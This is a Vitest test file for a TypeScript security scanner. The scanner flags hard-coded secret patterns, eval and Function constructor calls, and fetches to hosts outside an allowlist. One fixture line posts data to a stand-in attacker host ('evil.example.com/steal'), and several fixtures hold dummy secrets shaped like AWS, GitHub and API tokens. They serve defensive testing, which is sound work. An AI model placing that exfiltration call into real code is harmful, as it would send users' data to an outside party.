import { describe, expect, it } from "vitest";
import { hostAllowed, scanSecurity } from "../src/security";

const allowedHosts = ["gateway.ai.cloudflare.com", "*.artifacts.cloudflare.net", "localhost"];
const scan = (files: Record<string, string>) => scanSecurity(files, { allowedHosts });
const rules = (files: Record<string, string>) => scan(files).findings.map((f) => `${f.severity}:${f.rule}:${f.file}:${f.line}`);

describe("security scan", () => {
  it("finds secrets without echoing them", () => {
    const r = scan({
      "a.ts": 'const k = "AKIAABCDEFGHIJKLMNOP";',
      "keys.pem": "-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----",
      "b.md": "token ghp_" + "a".repeat(36),
      "c.ts": 'const cfg = { apiKey: "abcdEFGH1234abcdEFGH1234abcd" };',
      "d.ts": "const a = sk-ant-api03-" + "z".repeat(30),
    });
    expect(r.passed).toBe(false);
    expect(r.findings.map((f) => `${f.file}:${f.line}`)).toEqual(["a.ts:1", "b.md:1", "c.ts:1", "d.ts:1", "keys.pem:1"]);
    expect(JSON.stringify(r.findings)).not.toContain("a".repeat(36));
  });

  it("finds Artifacts repo tokens in both the documented and observed formats", () => {
    expect(
      rules({
        "v1.ts": `const t = "art_v1_${"0".repeat(40)}";`,
        "v2.ts": `const t = "art_v2_x_${"f".repeat(40)}?expires=1790000000";`,
      }),
    ).toEqual(["error:secret-pattern:v1.ts:1", "error:secret-pattern:v2.ts:1"]);
  });

  it("ignores documented placeholder keys", () => {
    expect(rules({ "a.ts": 'const k = "AKIAIOSFODNN7EXAMPLE";', ".dev.vars.example": "CF_API_TOKEN=YOUR_TOKEN_HERE_XXXXXXXXXXXXXXXXXXXX" })).toEqual([]);
  });

  it("flags eval and Function constructors, not look-alikes", () => {
    expect(
      rules({
        "e.ts": ['eval("1+1");', 'const f = new Function("a", "return a");', 'const g = Function("return this")();', 'const s = "eval(x)"; // eval(y)', "obj.eval(1);", "const h: Function = () => 1;"].join("\n"),
      }),
    ).toEqual(["error:eval:e.ts:1", "error:new-function:e.ts:2", "error:new-function:e.ts:3"]);
  });

  it("flags fetches to non-allowlisted hosts", () => {
    expect(
      rules({
        "f.ts": [
          'await fetch("https://evil.example.com/steal", { method: "POST" });',
          'await fetch("https://gateway.ai.cloudflare.com/v1/x");',
          'await fetch("https://acct.artifacts.cloudflare.net/git/q/r.git");',
          'await fetch("/relative");',
          "await fetch(url);",
          "await fetch(`https://${host}/x`);",
        ].join("\n"),
      }),
    ).toEqual(["error:disallowed-fetch-host:f.ts:1", "warning:dynamic-fetch-url:f.ts:5", "warning:dynamic-fetch-host:f.ts:6"]);
  });

  it("passes clean code; warnings do not fail", () => {
    const r = scan({ "ok.ts": 'export const x = 1;\nfetch(u);', "README.md": "# hello" });
    expect(r.passed).toBe(true);
  });

  it("hostAllowed wildcards", () => {
    expect(hostAllowed("a.b.artifacts.cloudflare.net", allowedHosts)).toBe(true);
    expect(hostAllowed("artifacts.cloudflare.net", allowedHosts)).toBe(false);
    expect(hostAllowed("evilartifacts.cloudflare.net", allowedHosts)).toBe(false);
  });
});
